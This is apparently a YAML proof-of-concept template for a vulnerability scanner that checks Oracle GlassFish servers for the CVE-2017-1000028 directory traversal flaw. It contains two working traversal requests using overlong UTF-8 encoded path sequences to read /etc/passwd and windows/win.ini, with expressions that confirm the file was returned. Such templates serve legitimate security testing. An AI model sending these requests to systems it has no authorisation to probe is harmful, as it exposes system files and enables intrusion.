name: yaml-poc-oracle-glassfish-directory_traversal-CVE-2017-1000028
binding: ec779881-434f-4372-91f9-ab29e5bcbe8d
detail:
    author: Ð¡z
    links:
        - https://www.exploit-db.com/exploits/45196/
        - https://www.exploit-db.com/exploits/45198/
        - https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904
    vulnerability:
        id: be4cfe8c-da94-488b-a228-4d6a2edd5d24
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
            follow_redirects: false
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
    r1:
        request:
            cache: true
            method: GET
            path: /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
            follow_redirects: false
        expression: response.body_string.contains("for 16-bit app support") && response.body_string.contains("extensions")
expression: r0() || r1()
